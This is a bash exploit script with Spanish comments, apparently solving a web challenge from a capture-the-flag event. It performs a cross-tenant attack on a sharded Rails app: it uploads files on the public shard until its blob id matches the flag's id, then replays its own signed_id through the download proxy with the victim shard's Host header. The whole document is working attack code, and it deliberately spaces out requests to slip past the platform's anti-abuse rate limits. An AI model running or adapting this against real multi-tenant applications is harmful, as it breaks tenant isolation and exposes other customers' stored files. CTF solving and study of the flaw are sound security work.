#!/bin/bash
# Tenant Improvement (Fluid Attacks CTF 2026, Web) -- cross-tenant por reuso de signed_id entre shards.
# Uso:    ./tenant_signed_id_cross_shard.sh <base_host> [victim_shard] [target_blob_id]
# Ejemplo: ./tenant_signed_id_cross_shard.sh 8e...chal.ctf.ae interna 2
#
# Rails horizontal sharding por primer label del Host; object store de Active Storage compartido.
# signed_id = HMAC(blob_id, SECRET_KEY_BASE) -> ata por id, NO por shard. Subiendo docs en el shard
# demo hasta que MI blob tome el mismo id que la flag (id=2 en el shard interno), el proxy de descarga
# con Host cambiado sirve el blob de la victima.
# ⚠️ CADENA MINIMA (~5 requests, espaciados) -- la plataforma tiene un rate-limit/anti-abuso agresivo.

HOST="${1:?host}"
VSHARD="${2:-interna}"          # shard de la victima (primer label del Host)
TARGET_ID="${3:-2}"            # blob id de la flag en el shard victima (del seed setup_db.rb)
BASE="https://demo.$HOST"      # mi shard (publico)
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
JAR=$(mktemp); trap 'rm -f "$JAR"' EXIT
PAUSE=1.5

req(){ sleep "$PAUSE"; curl -sk -A "$UA" -b "$JAR" -c "$JAR" "$@"; }

echo "[*] 1) signup en el shard demo"
req -X POST "$BASE/signup" -H 'Content-Type: application/json' \
    -d '{"email":"a@a.test","password":"Passw0rd!","name":"a"}' -o /dev/null

echo "[*] 2-3) subir docs hasta que MI blob tome id=$TARGET_ID (ids secuenciales en shard vacio)"
for i in 1 2; do
  req -X POST "$BASE/documents" -F "file=@/etc/hostname" -o /dev/null
done

echo "[*] 4) listar para tomar MI signed_id del blob id=$TARGET_ID"
LIST=$(req "$BASE/documents.json")
SIGNED_ID=$(printf '%s' "$LIST" | grep -oE '"signed_id":"[^"]+"' | sed -n "${TARGET_ID}p" | cut -d'"' -f4)
echo "    signed_id = $SIGNED_ID"

echo "[*] 5) descargar el proxy con Host=$VSHARD.$HOST -> sirve el blob de la victima"
req --resolve "$VSHARD.$HOST:443:$(getent hosts "$HOST" | awk '{print $1}')" \
    "https://$VSHARD.$HOST/rails/active_storage/blobs/proxy/$SIGNED_ID/flag"
echo
